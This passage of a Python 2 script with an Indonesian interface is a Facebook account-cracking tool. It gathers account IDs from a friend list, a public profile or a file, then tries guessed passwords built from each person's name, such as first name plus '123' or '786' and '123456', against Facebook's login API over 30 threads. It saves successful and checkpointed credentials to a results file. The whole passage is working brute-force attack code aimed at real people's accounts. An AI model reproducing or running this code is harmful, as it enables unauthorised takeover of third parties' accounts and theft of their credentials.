    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone prancis.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_turkey():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;91m _________   ________.    '
    print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;91m  \\______  /|__|   |___  /'
    print '\x1b[1;91m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mTurky\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_turkey()


def pilih_turkey():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_turkey()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK TURKY \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK TURKY \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_turkey()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;91m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '              \x1b[1;94m>>> \x1b[1;93mCRACK TURKY \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_turkey()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_turkey()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/turkey.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/turkey.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/turkey.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/turkey.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/turkey.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/turkey.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '786'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/turkey.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/turkey.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/turkey.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/turkey.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/turkey.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/turkey.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/turkey.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/turkey.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/turkey.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/turkey.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
